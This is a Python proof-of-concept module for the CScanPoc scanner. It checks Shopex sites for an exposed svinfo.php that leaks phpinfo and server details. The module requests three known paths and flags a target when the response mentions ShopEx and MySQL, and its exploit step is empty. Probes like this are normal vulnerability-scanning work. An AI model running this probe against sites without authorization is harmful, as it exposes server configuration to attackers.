# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'Shopex_0004' # 平台漏洞编号，留空
    name = 'Shopex /svinfo.php phpinfo信息泄露漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-10-30'  # 漏洞公布时间
    desc = '''
        /app/dev/svinfo.php?phpinfo=true
        /app/dev/svinfo.php?download=true
        /install/svinfo.php?phpinfo=true
        存在信息泄露危害
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Shopex'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6e0bbc26-c664-4b6c-9c4b-61c646b31378'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_list =  ['/app/dev/svinfo.php?phpinfo=true',
                      '/install/svinfo.php?phpinfo=true',
                      '/app/dev/svinfo.php?download=true']
            for filename in file_list:
                verify_url = '{target}'.format(target=self.target)+filename
                req = urllib2.urlopen(verify_url)
                content = req.read()
                if 'ShopEx' in content and 'MySQL' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()